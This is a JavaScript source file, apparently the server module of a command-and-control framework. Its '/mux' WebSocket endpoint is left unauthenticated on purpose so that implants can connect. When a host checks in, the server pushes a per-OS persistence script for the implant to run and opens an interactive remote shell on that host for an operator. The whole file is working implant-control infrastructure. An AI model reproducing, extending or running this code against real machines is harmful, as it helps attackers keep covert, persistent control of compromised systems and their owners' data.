import path from "node:path";
import fs from "node:fs";
import { fileURLToPath } from "node:url";
import protobuf from "protobufjs";

import config from "../config.js";
import { registry } from "../core/registry.js";
import { hosts } from "../core/hosts.js";

const here = path.dirname(fileURLToPath(import.meta.url));
const PROTO_VERSION = 1;

// Directory holding per-OS autoexec scripts. The server reads
// autoexec/<os>.sh (or .ps1 for windows) on host connect and sends the
// contents to the client in an AutoExec frame so it can run a
// persistence/setup script without hardcoding it in the binary. Mounted as
// a volume in production (AUTOEXEC_DIR env var).
const AUTOEXEC_DIR = process.env.AUTOEXEC_DIR
  ? path.resolve(process.env.AUTOEXEC_DIR)
  : path.resolve(here, "..", "autoexec");

// Load the protobuf schema once at startup (synchronous — no codegen step).
const root = protobuf.loadSync(path.resolve(here, "..", "proto", "mux.proto"));
const Frame = root.lookupType("mux.Frame");

const encode = (obj) => Buffer.from(Frame.encode(Frame.create(obj)).finish());

// Read the autoexec script for a given os, if any. Returns null if no file.
function readAutoExec(osName) {
  if (!osName) return null;
  const isWindows = osName === "windows" || osName === "win";
  const ext = isWindows ? "ps1" : "sh";
  const file = path.resolve(AUTOEXEC_DIR, `${osName}.${ext}`);
  if (!file.startsWith(AUTOEXEC_DIR + path.sep)) return null;
  if (!fs.existsSync(file)) return null;
  const script = fs.readFileSync(file);
  return {
    os: osName,
    shell: isWindows ? "powershell" : "sh",
    script,
  };
}

// One connected Go client. Owns a set of channels; each opened channel becomes
// a Session in the shared registry.
class Host {
  constructor(ws, remote) {
    this.ws = ws;
    this.remote = remote;
    this.hello = {};
    this.alive = true;
    this.createdAt = Date.now();
    this._channelSeq = 0;
    this._channels = new Map(); // channelId -> { session }
    this._pending = new Map(); // channelId -> { command, cols, rows }
  }

  send(obj) {
    if (this.ws.readyState === 1) this.ws.send(encode(obj));
  }

  meta() {
    return {
      kind: "host",
      id: this.id,
      remote: this.remote,
      hostname: this.hello.hostname || "",
      username: this.hello.username || "",
      os: this.hello.os || "",
      arch: this.hello.arch || "",
      tags: this.hello.tags || "",
      channels: this._channels.size,
      channelList: [...this._channels.entries()].map(([id, ch]) => ({
        channelId: id,
        sessionId: ch.session.id,
        alive: ch.session.alive,
      })),
      alive: this.alive,
      createdAt: this.createdAt,
    };
  }

  label() {
    const who = this.hello.hostname
      ? `${this.hello.username || "?"}@${this.hello.hostname}`
      : this.remote;
    return who;
  }

  // Ask the client to spawn a new PTY shell.
  openChannel({ command = "", cols = 80, rows = 24 } = {}) {
    if (!this.alive) return null;
    const channelId = ++this._channelSeq;
    this._pending.set(channelId, { command, cols, rows });
    this.send({ openRequest: { channelId, command, cols, rows } });
    return channelId;
  }

  onOpenOk(channelId, pid) {
    const pend = this._pending.get(channelId);
    if (!pend) return;
    this._pending.delete(channelId);

    const backend = {
      write: (buf) => this.send({ data: { channelId, data: buf } }),
      resize: (cols, rows) => this.send({ resize: { channelId, cols, rows } }),
      close: () => this.send({ close: { channelId, reason: "operator" } }),
    };

    const session = registry.create({
      transport: "mux",
      remote: `${this.label()} ch#${channelId}`,
      backend,
    });
    // A mux channel is a real PTY on the far side already.
    session.upgraded = true;
    session.cols = pend.cols;
    session.rows = pend.rows;
    if (pid) session.pid = pid;

    this._channels.set(channelId, { session });
    hosts.update(this);
  }

  onOpenError(channelId, message) {
    this._pending.delete(channelId);
    console.error(`[mux]  channel ${channelId} open failed: ${message}`);
  }

  onData(channelId, data) {
    const ch = this._channels.get(channelId);
    if (ch) ch.session.push(Buffer.from(data));
  }

  onClose(channelId) {
    const ch = this._channels.get(channelId);
    if (!ch) return;
    ch.session.markExit();
    this._channels.delete(channelId);
    hosts.update(this);
  }

  teardown() {
    this.alive = false;
    for (const { session } of this._channels.values()) session.markExit();
    this._channels.clear();
  }
}

export function registerMux(app) {
  if (!config.ENABLE_MUX) return;

  app.ws("/mux", (ws, req) => {
    // UNAUTHENTICATED on purpose: this is where implants connect.
    ws.binaryType = "arraybuffer";
    const remote =
      (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
      req.socket.remoteAddress ||
      "unknown";

    let host = null;

    const ping = setInterval(() => {
      if (ws.readyState === 1) ws.send(encode({ ping: { nonce: 0 } }));
    }, config.MUX_PING_MS);

    ws.on("message", (raw) => {
      let frame;
      try {
        frame = Frame.decode(new Uint8Array(raw));
      } catch (e) {
        return; // ignore malformed frames
      }
      const kind = frame.kind; // populated oneof field name

      if (kind === "hello") {
        if (host) return;
        // Token auth: if BUILD_TOKEN is set, the client's Hello must carry it.
        // A missing/mismatched token closes the connection immediately.
        if (config.BUILD_TOKEN && frame.hello.token !== config.BUILD_TOKEN) {
          console.warn(`[mux]  rejected host from ${remote}: bad or missing token`);
          ws.close(1008, "unauthorized");
          return;
        }
        host = new Host(ws, remote);
        host.hello = {
          hostname: frame.hello.hostname,
          username: frame.hello.username,
          os: frame.hello.os,
          arch: frame.hello.arch,
          tags: frame.hello.tags,
          version: frame.hello.version,
        };
        hosts.add(host);
        console.log(`[mux]  host ${host.id} connected: ${host.label()} (${remote})`);

        // Send the per-OS autoexec script if one exists. The client runs it
        // locally (persistence / setup) — not as a shell channel.
        const ae = readAutoExec(frame.hello.os);
        if (ae) {
          console.log(`[mux]  sending autoexec for ${frame.hello.os} to ${host.id}`);
          host.send({ autoExec: ae });
        }

        // Auto-open one shell so the host is immediately usable.
        host.openChannel();
        return;
      }

      if (!host) return; // everything else requires a Hello first

      switch (kind) {
        case "openOk":
          host.onOpenOk(frame.openOk.channelId, frame.openOk.pid);
          break;
        case "openError":
          host.onOpenError(frame.openError.channelId, frame.openError.message);
          break;
        case "data":
          host.onData(frame.data.channelId, frame.data.data);
          break;
        case "close":
          host.onClose(frame.close.channelId);
          break;
        case "ping":
          host.send({ pong: { nonce: frame.ping.nonce } });
          break;
        case "pong":
          break;
        default:
          break;
      }
    });

    const shutdown = () => {
      clearInterval(ping);
      if (host) {
        host.teardown();
        hosts.remove(host.id);
        console.log(`[mux]  host ${host.id} disconnected`);
      }
    };
    ws.on("close", shutdown);
    ws.on("error", shutdown);
  });
}

export { PROTO_VERSION };
